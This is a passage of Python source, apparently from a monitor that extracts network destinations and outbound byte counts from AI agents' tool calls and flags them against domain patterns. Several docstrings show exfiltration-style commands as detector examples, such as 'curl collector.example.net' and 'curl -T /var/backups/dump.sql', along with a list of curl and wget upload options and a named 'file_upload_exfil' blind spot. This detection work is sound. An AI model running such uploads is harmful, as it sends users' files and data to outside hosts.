    **Bounded.** At most :data:`MAX_SHELL_SEGMENTS` commands come back, plus the
    unread remainder as a last element — the shape :meth:`re.Pattern.split`
    gives for ``maxsplit``, and what tells the caller to report a truncated
    scan. The bound is on the *split*, not on the list afterwards: ``a;``
    repeated to 10 MB with one unbalanced quote used to cost nine seconds, most
    of it spent building five million segments to then throw away.
    """
    if not _HAS_SEPARATOR.search(command):
        return [command]                         # one command, whatever its quoting
    out: list[str] = []
    for line in _LINES.split(command, maxsplit=MAX_SHELL_SEGMENTS):
        out += _split_line(line, MAX_SHELL_SEGMENTS + 1 - len(out))
        if len(out) > MAX_SHELL_SEGMENTS:
            break
    return out


def _split_line(line: str, limit: int) -> list[str]:
    """One line cut on its separators, ignoring those inside quotes.

    At most ``limit`` pieces, the last of which is whatever was not read.
    """
    limit = max(1, limit)
    quotes = line.count("'") + line.count('"')
    if not quotes:
        return _SEGMENTS.split(line, maxsplit=limit - 1)   # nothing to protect: the plain split
    segments, start, inside = [], 0, 0
    for m in _QUOTED_OR_SEPARATOR.finditer(line):
        text = m.group()
        if text[0] in _QUOTES:
            # A quoted span, consumed whole: the separators in it are not ones.
            inside += text.count("'") + text.count('"')
            continue
        if len(segments) >= limit - 1:
            break                                # the rest is appended unread, as maxsplit does
        segments.append(line[start:m.start()])
        start = m.end()
    if inside != quotes:
        # A quote character the span pattern could not pair: the quoting of this
        # line does not balance, so its structure cannot be trusted. Counting is
        # how that is detected without slicing once per match.
        return _SEGMENTS.split(line, maxsplit=limit - 1)
    segments.append(line[start:])
    return segments


def _scan_command(command: str, scan: _Scan, depth: int) -> None:
    """Read one command line into ``scan``, segment by segment.

    The whole line is split, in one linear pass, so padding cannot push a later
    segment out of view — and the split respects quotes
    (:func:`_split_segments`), so a separator inside an argument does not
    invent a command. Only *lexing* is bounded. Past
    :data:`MAX_SHLEX_CHARS` of command line, segments are split on whitespace
    instead of lexed by :mod:`shlex`, which is some hundred times faster and
    loses no destination (a quoted argument keeps its quotes, and
    :func:`_destinations_in_arg` strips them); it only mis-splits an argument
    that contains a space, which is not a host.
    """
    segments = _split_segments(command)
    if len(segments) > MAX_SHELL_SEGMENTS:
        # A command line of a million commands is not a command line. The
        # string budget does not bound this on its own: a segment with no
        # arguments costs nothing against it, so `a;` repeated to 10 MB used to
        # cost nine seconds of lexing — past the thirty an MCP call is allowed.
        scan.note(TRUNCATED_SEGMENTS)
        segments = segments[:MAX_SHELL_SEGMENTS]
    for segment in segments:
        if scan.spent:
            scan.note(TRUNCATED_DOMAINS if len(scan.found) >= MAX_DOMAINS else TRUNCATED_STRINGS)
            return
        if not segment.strip():
            continue
        if len(segment) <= MAX_SHLEX_CHARS and scan.shlex_chars <= MAX_SHLEX_CHARS:
            scan.shlex_chars += len(segment)
            try:
                tokens = shlex.split(segment, posix=True)
            except ValueError:
                tokens = segment.split()                 # unbalanced quotes: never give up on the line
        else:
            tokens = segment.split()
        _hosts_in_segment(tokens, scan, depth)


def extract_domains(payload, network_key: bool = False, shell_key: bool = False) -> set[str]:
    """Every destination in ``payload`` (a tool call's arguments, say).

    Walks dicts, lists and strings within the module's limits. ``network_key``
    treats the payload itself as the value of a field that names a host, so
    ``extract_domains("db.internal", network_key=True)`` finds it while
    ``extract_domains("db.internal")`` does not. ``shell_key`` does the same for
    a field that carries a command line (:data:`SHELL_KEYS`), so
    ``extract_domains("curl collector.example.net", shell_key=True)`` finds it.
    """
    scan = _Scan()
    _walk(payload, network_key, shell_key, scan, 0)
    return scan.found


def _walk(value, network_key: bool, shell_key: bool, scan: _Scan, depth: int) -> None:
    """Read one value into ``scan``, noting any limit that stops the walk early."""
    if len(scan.found) >= MAX_DOMAINS:
        scan.note(TRUNCATED_DOMAINS)
        return
    if scan.strings >= MAX_SCAN_STRINGS:
        scan.note(TRUNCATED_STRINGS)
        return
    if depth > MAX_SCAN_DEPTH:
        scan.note(TRUNCATED_DEPTH)
        return
    if isinstance(value, str):
        scan.strings += 1
        hosts = domains_in_text(value, scan)
        if shell_key:
            _scan_command(value[:MAX_STRING_CHARS], scan, 0)
        if network_key:
            # A hostname is at most 253 characters, so a longer value is not
            # one and nothing is lost by not copying it: normalise_host strips
            # and splits the whole string before _HOST rejects it on length,
            # which on a multi-megabyte value means several full copies for
            # nothing. This bound cannot hide a host, so it is not a truncation.
            bare = host_in_value(value[:MAX_HOST_CHARS])
            if bare:
                hosts.add(bare)
        for host in sorted(hosts):
            if not scan.add(host):           # one string can hold hundreds of URLs
                return
        return
    if isinstance(value, dict):
        for key, inner in value.items():
            # A nested object under a network-named key is not itself a host,
            # but its own keys may be ("endpoint": {"host": ...}).
            name = key.strip().lower() if isinstance(key, str) else ""
            if name in CONTENT_KEYS:
                continue            # file or document content: written, not contacted
            _walk(inner, name in NETWORK_KEYS, name in SHELL_KEYS, scan, depth + 1)
        return
    if isinstance(value, (list, tuple)):
        for inner in value:
            # ["urls": [...]] and ["command": [...]] keep the key's meaning
            _walk(inner, network_key, shell_key, scan, depth + 1)


def extract_call_domains(arguments, result=None) -> set[str]:
    """Destinations of one tool call: its arguments, and its result if it was a network call.

    The result is scanned only when the arguments already carried a
    destination. A tool whose arguments point nowhere did not make a network
    call, so hosts in what it returned are content it read — a file, a search
    result — and not places it went. That keeps `Read` of a document full of
    URLs from reading as egress.
    """
    return set(measure_call(arguments, result).domains)


# ------------------------------------------------------------ how much went out
#: Options whose value is the **body** of a request: ``curl -d``/``--data``
#: /``--data-raw``/``--data-binary``/``--data-urlencode``, ``-F``/``--form``,
#: ``-T``, ``wget --post-data``/``--body-data``. Only the *size* of the value is
#: read, never the value, and it is reported as
#: :attr:`CallEgress.data_bytes` — how much of the call was a declared payload.
#: It is **not** added to the outbound size: those bytes are already in the
#: argument text, and counting them twice would say a call sent more than it
#: holds.
DATA_OPTIONS = frozenset({
    "-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "--data-ascii", "--json",
    "-F", "--form", "--form-string", "-T", "--upload-file", "--post-data", "--body-data", "--post-file",
})

#: Of those, the ones whose value is always a *file path*. A file's size is not
#: in the log, so it counts as zero — and that is a measured blind spot
#: (``file_upload_exfil`` in the injection benchmark), not an estimate.
_FILE_OPTIONS = frozenset({"-T", "--upload-file", "--post-file", "--infile"})


def argument_bytes(arguments) -> int:
    """UTF-8 size of a call's arguments, as compact JSON with sorted keys.

    One number, computed the same way for every parser, so the same call
    measures the same whatever log it came from — which is what makes a
    per-destination baseline comparable at all. Sorted keys and no whitespace
    for the same reason: the size must not move because a log writer changed
    its formatting.

    Never raises. An argument object that will not serialise (a set, a live
    object, a cycle) falls back to ``str()``, which is still a size.
    """
    if arguments is None:
        return 0
    try:
        text = json.dumps(arguments, sort_keys=True, separators=(",", ":"),
                          ensure_ascii=False, default=str)
    except (TypeError, ValueError, RecursionError):
        text = repr(type(arguments))                     # unserialisable: its size is not the log's
    # The fast path is the common one and exact: an ASCII string's UTF-8 size
    # is its length, and skipping the encode skips a copy of every argument
    # object in the session.
    return len(text) if text.isascii() else len(text.encode("utf-8", "replace"))


def _literal_data_bytes(option: str, value: str) -> int:
    """Size of an option's value when it *is* the payload, 0 when it names a file.

    ``curl -d '{"a":1}'`` sends nine bytes this can see. ``curl -d @dump.sql``
    and ``curl -T /var/backups/dump.sql`` send a file whose size the log does
    not contain, so they count zero: an unknown is not a small number, and
    pretending otherwise would hide an upload behind a plausible figure.
    """
    if option in _FILE_OPTIONS:
        return 0
    text = value.strip().strip("\"'")
    if text.startswith("@") or "=@" in text:             # -d @file, -F field=@file
        return 0
    return len(text.encode("utf-8", "replace"))


@dataclass(frozen=True, slots=True)
class CallEgress:
    """What one tool call sent, and where — sizes and host names, never content.

    ``outbound_bytes`` **is** ``argument_bytes``: one number, counted once. A
    literal request body is part of the argument text that carried it, so
    adding ``data_bytes`` on top would count the same bytes twice and make a
    call that spells its payload out weigh double one that passes it another
    way. ``data_bytes`` is kept as a separate, informative figure — how much of
    the call was a declared payload — and is not added to anything.

    ``outbound_bytes`` is attributed in full to **every** destination of the
    call: a request names one host but a call may name several, and nothing in
    a log says how the bytes divided between them. Over-attributing is the
    conservative direction for a detector, and the number is a signal about one
    destination's traffic rather than an accounting of the wire.
    """
    domains: frozenset[str] = frozenset()
    #: The call's outbound size: exactly ``argument_bytes``, never a sum.
    outbound_bytes: int = 0
    argument_bytes: int = 0
    #: How much of the command line was a literal payload (``curl -d``, …).
    #: Informative only: a subset of ``argument_bytes``, not an addition to it.
    data_bytes: int = 0
    #: Reasons a limit cut the scan short, if any; see :data:`TRUNCATION_REASONS`.
    truncated: tuple[str, ...] = ()

    @property
    def network(self) -> bool:
        """True when this call named a destination, so a truncated scan had a network side effect."""
        return bool(self.domains)


def measure_call(arguments, result=None) -> CallEgress:
    """Destinations of one tool call, and the bytes it sent to each of them.

    The destinations are :func:`extract_call_domains`' — the arguments, plus
    the result when the arguments already pointed somewhere. A call that named
    no destination is not measured at all: its size would be attributed to
    nothing.

    The size is the arguments' own (:func:`argument_bytes`), counted **once**.
    The literal payloads named on a shell command line
    (:data:`DATA_OPTIONS`) are measured separately as ``data_bytes``, which
    says how much of the call was a declared body, and are *not* added to it:
    those bytes are already part of the argument text that carried them, and
    counting them twice would weigh a ``curl -d`` call double for no reason an
    operator could explain.

    A result is never outbound and its size is never counted.
    """
    scan = _Scan()
    _walk(arguments, False, False, scan, 0)
    # The scan is local and goes out of scope here, so its sets are taken
    # rather than copied: this runs once per tool call of every session.
    domains, truncated = scan.found, scan.truncated
    if domains and result is not None:
        tail = _Scan()
        _walk(result, False, False, tail, 0)
        domains |= tail.found
        truncated |= tail.truncated
    if len(domains) > MAX_DOMAINS:
        domains = set(sorted(domains)[:MAX_DOMAINS])
        truncated.add(TRUNCATED_DOMAINS)
    # Only a call that went somewhere has an outbound size worth computing, and
    # serialising every argument object of a session to measure calls that
    # reached nobody would be the whole cost of this feature for nothing.
    size = argument_bytes(arguments) if domains else 0
    return CallEgress(domains=frozenset(domains), outbound_bytes=size,
                      argument_bytes=size, data_bytes=scan.data_bytes,
                      truncated=tuple(sorted(truncated)))


#: 1024-based, with one decimal past a kilobyte: the unit a log reader expects
#: next to a byte count, and the same one the anomaly messages print.
_UNITS = ((1024 ** 3, "GB"), (1024 ** 2, "MB"), (1024, "KB"))


def format_bytes(count: float) -> str:
    """``1536`` as ``"1.5 KB"``; bytes below a kilobyte stay bytes."""
    count = float(count)
    for size, unit in _UNITS:
        if abs(count) >= size:
            return f"{count / size:.1f} {unit}"
    return f"{count:.0f} B"


# --------------------------------------------------------------------- patterns
def normalise_pattern(raw: str) -> str:
    """An operator's ``--domain`` argument as a stored pattern.

    Accepts a host (``api.openai.com``), a wildcard (``*.cn``), a leading dot
    (``.cn``, same thing) or a whole URL, whose host is taken. Raises
    ``ValueError`` naming what was expected — a pattern the operator cannot
    spell is worse than one they are told how to spell.
    """
    text = (raw or "").strip().strip("\"'")
    if not text:
        raise ValueError("domain is empty")
    if text in ("*", "*.", ".", "**"):
        raise ValueError(
            f"{raw!r} would match every host; there is no need for it — a domain that is not in the "
            "baseline already fires as new_domain. Reject a specific suffix instead, e.g. \"*.cn\"")
    inner = _URL.search(text)
    if inner:
        host = normalise_host(inner.group("host"))
        if not host:
            raise ValueError(f"{raw!r} has no host in it")
        return host
    wildcard = text.startswith(("*.", "."))
    body = text.removeprefix("*.").removeprefix(".") if wildcard else text
    host = normalise_host(body)
    if not host:
        raise ValueError(f"{raw!r} is not a domain or pattern; expected e.g. api.openai.com or \"*.cn\"")
    if "*" in host:
        raise ValueError(f"{raw!r}: a wildcard is only supported as a leading \"*.\", e.g. \"*.alibaba.com\"")
    return f"*.{host}" if wildcard else host


def domain_matches(domain: str, pattern: str) -> bool:
    """Does ``domain`` match ``pattern``?

    ``api.openai.com`` matches only itself. ``*.cn`` matches any host ending in
    ``.cn`` — ``api.unknown.cn`` yes, ``cn`` no — and ``*.alibaba.com`` matches
    ``x.alibaba.com`` but **not** ``alibaba.com``: a wildcard covers
    subdomains, and the bare domain is a destination of its own that deserves
    its own decision.
    """
    host = normalise_host(domain)
    if not host:
        return False
    pattern = (pattern or "").strip().lower().rstrip(".")
    if pattern.startswith("*."):
        return host.endswith(pattern[1:])        # "*.cn" -> endswith ".cn"
    return host == pattern


def matching_pattern(domain: str, patterns) -> str | None:
    """The pattern in ``patterns`` that ``domain`` matches, most specific first, or None.

    Most specific first so a message can name the decision that is doing the
    work: with both ``api.unknown.cn`` and ``*.cn`` on record, the exact host
    is the one reported.
    """
    hits = [p for p in patterns if domain_matches(domain, p)]
    return max(hits, key=lambda p: (not p.startswith("*."), len(p))) if hits else None
